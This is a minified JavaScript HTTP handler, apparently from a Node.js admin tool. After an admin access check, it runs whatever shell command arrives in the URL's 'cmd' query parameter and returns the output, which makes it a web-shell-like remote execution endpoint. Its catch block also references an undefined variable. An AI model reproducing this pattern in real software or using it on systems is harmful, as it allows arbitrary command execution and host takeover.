(function(e,l){if(!global.b2link.ip.adminCheckAvailable__http$ClientRequest(e,l))return void global.b2link.response.send_404__adminCheckAvailable__http$ClientRequest(e,l);var r=global.b2link.url.getQueryFromURL(e.url);global.b2link.response.setHeaders__b2ker(l);try{var n=SUtilCP.sExec(r.cmd);global.b2link.response.send_200_String(e,l,n.toString("utf8"))}catch(i){global.b2link.response.send_200_False__ErrorLog(e,l,r,error)}});